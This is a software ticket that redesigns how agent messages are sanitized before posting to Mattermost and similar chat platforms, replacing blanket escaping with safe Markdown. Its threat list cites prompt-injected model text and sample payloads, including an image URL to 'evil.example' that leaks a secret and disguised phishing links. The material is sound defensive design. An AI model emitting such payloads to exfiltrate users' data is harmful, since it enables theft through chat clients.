# FIX-142: Agent messages keep their formatting on chat platforms — safe Markdown instead of escaping everything — **medium, phase 5**

## Goal
The owner (2026-11-14), with a screenshot of a Mattermost post from an agent: "messages get to
Mattermost with the formatting escaped, so they end up unformatted." The post shows `**Funny:**`,
`**Your meetings today:**` and a `` `insufficient_scope` `` code span as literal characters.

This is the current design, not a slip. Every piece of agent text bound for a chat platform goes
through `Content::untrusted` (`crates/aurora-channels/src/content.rs`), which calls
`aurora_core::sanitize::markdown_as_data`. That function backslash-escapes every Markdown-active
character (`* _ \` [ ] ( ) < > # + - ! | ~ = { } &`, `.` after a digit), so no formatting survives.
Call sites:
- `services/aurora-api/src/domains/channels/mirror.rs` `post_answer` (turn answers mirrored to the
  thread) — the screenshot's path;
- `services/aurora-api/src/domains/channels/messaging.rs` `compose` and `bad_text` (`send_message`).

The rule behind it is SEC-18 and `13 §6` invariant 4 ("Untrusted text stays data"). The dashboard,
however, already renders the same model text as **safe Markdown** (`14`, safe mode; FIX-137 extends it
to full CommonMark + GFM with link and image rules). Chat platforms should get the same treatment:
formatting kept, the dangerous constructs neutralised.

## Threats the escaping covers today, and how safe Markdown must still cover them
Model text can be steered by prompt injection (an email, a web page, an issue it read). What matters
on a chat platform:
1. **Disguised links**: `[your payslip](https://evil.example)`. → links only `http`, `https`, `mailto`;
   when the label is not the URL itself, append the destination host as plain text after the link
   (`[your payslip](https://evil.example) (evil.example)`), the same rule as FIX-137's host suffix.
   Any other scheme (`javascript:`, `data:`, relative, …): the label as text, no link.
2. **Images loaded without a click** (`![](https://evil.example/?d=<secret>)`): clients fetch them, which
   leaks data with no interaction. → never emit `![`: an image becomes a link
   `[image: <alt>](<url>) (<host>)` under rule 1, or text if the URL fails rule 1.
3. **Raw HTML** (block or inline): → escaped, shown as text.
4. **Mention and broadcast syntax**: `<@user:…>`, `<#space:…>`, `<@here>` neutral tokens must not form
   from model text (the core's `with_here` is the only source of `<@here>`). → `<` in text stays
   escaped (rule 3 covers it); the Mattermost connector's `defuse` of `@channel`/`@all`/`@here`
   stays as is.
5. **Platform-specific active syntax**: for Mattermost, check (and record in the commit) whether any
   construct besides the above becomes active — e.g. `:emoji:` is harmless; slash commands are not
   executed from posts. Personal `@username` mentions are **unchanged** by this brief (escaping
   never stopped them either: `@` was not escaped).

Not covered by escaping today either, so out of scope here but **to record**: Mattermost autolinks
bare URLs and may fetch a **link preview** server-side (`EnableLinkPreviews`). Find out whether
Mattermost offers a per-post way to suppress previews; if it does, the connector uses it for agent
posts (and this brief owns that change in `connectors/mattermost`); if not, add one line to the
operator doc (`docs/operator/plugins-and-connectors.md`, Mattermost section) that link previews let Mattermost fetch URLs an agent
writes, and that an admin can turn them off.

## Plan
### 0. Spec (Opus, first)
Decision **D-226** (amends SEC-18 for chat platforms): "agent text sent to a chat platform is rendered
as safe Markdown: formatting kept; links only http/https/mailto with the host shown when the label
differs; images never inline; raw HTML and mention tokens as text. Labels, card text, notices and
anything that is not an agent's own message body stay `markdown_as_data`." Update `13 §4.3` (neutral
content), `13 §6` invariant 4 wording, `20 §Rendering`, the SEC-18 row in `17` ("rendered as data or as
safe Markdown per D-226"), and `docs/tests/security-coverage.md` for the new tests.

### 1. Sanitizer (`crates/aurora-core/src/sanitize.rs`)
`pub fn markdown_safe(s: &str, max: usize) -> String`:
- `block` first (controls/bidi stripped, clamp), as `markdown_as_data` does;
- parse with `pulldown-cmark` (already a workspace dependency, 0.13; add it to `aurora-core`) with
  tables, strikethrough and task lists on;
- re-emit Markdown: paragraphs, emphasis, strong, strikethrough, inline code, fenced and indented code
  (fence long enough for the content), headings, ordered/unordered/task lists, block quotes, tables,
  rules, hard breaks; **text nodes re-escaped** with the `markdown_as_data` character set so nothing
  new forms on re-emission; links and images per the threat rules above; HTML as escaped text;
- output is idempotent-safe: `markdown_safe(markdown_safe(x))` renders the same.
Either hand-write the emitter over pulldown events (preferred: small, no new crate) or use
`pulldown-cmark-to-cmark` if it is maintained and licence-compatible — say which in the commit.

### 2. Content constructor (`crates/aurora-channels/src/content.rs`)
`Content::agent_markdown(raw)` using `markdown_safe`; doc comment says when to use it (an agent's
own message body only). `untrusted` and `platform` unchanged.

### 3. Call sites (`services/aurora-api/src/domains/channels/`)
- `mirror.rs` `post_answer`: chunks through `agent_markdown`. The chunker must not split inside a
  fenced code block or a table: split at block boundaries; if one block is longer than a chunk, close
  the fence at the cut and reopen it (same info string) in the next chunk. Update the `CHUNK_MAX`
  comment (re-emission no longer doubles the text the way escaping did) but keep checking the
  **rendered** chunk against `message_max_chars`.
- `messaging.rs` `compose` and `bad_text`: `agent_markdown` for the body; the "via" line stays
  `Content::platform` + `sanitize::label`.
- Grep for other places an agent's message body reaches a platform (`Content::untrusted` callers in
  `services/aurora-api/src/domains/channels/**`) and list them in the commit; card text, labels and
  approval summaries stay `untrusted`.

### 4. Connector
`connectors/mattermost/src/render.rs` `render_text`: check it still works on formatted input
(mention tokens are already neutralised upstream; `defuse` inside a code span or block must not
break the fence). Link-preview item above if Mattermost supports it.

## Acceptance criteria
- [ ] Unit tests (table-driven) for `markdown_safe`: bold/italic/strike/code/lists/headings/quotes/
      tables kept; `[label](https://x.example/p)` → link + `(x.example)`; bare URL and `<https://…>`
      kept as a URL; `javascript:`/`data:`/relative links → text; image → link with host, never `![`;
      inline and block HTML → escaped; `<@here>`, `<@user:x>`, `<#space:x>` in input never survive as
      tokens; a code fence containing backticks; nested lists; the owner's screenshot text renders

      `connectors/mattermost`, the two IT files; the full channels IT group at batch end.
